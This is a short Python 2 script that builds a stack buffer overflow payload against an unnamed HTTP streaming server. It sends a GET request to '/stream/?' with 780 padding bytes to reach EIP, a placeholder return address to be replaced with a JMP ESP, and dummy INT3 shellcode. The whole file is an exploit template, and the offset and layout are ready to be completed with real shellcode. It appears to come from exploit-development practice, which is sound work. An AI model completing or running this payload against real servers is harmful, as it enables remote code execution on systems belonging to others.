#!/usr/bin/python2

import os # for output setting
import sys
import struct # for pack function

# turn off output buffer and set binary mode
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)

prefix = "GET /stream/?"
suffix = " HTTP/1.0\n\n"

pad_length = 780           # distance to EIP
pad_char = "A"

ret_address = 0x42424242   # replace with a suitable JMP ESP

shellcode = "\xCC" * 200   # dummy shellcode INT 3

payload = prefix + pad_char * pad_length + struct.pack('<I', ret_address) + shellcode + suffix;

sys.stdout.write(payload)

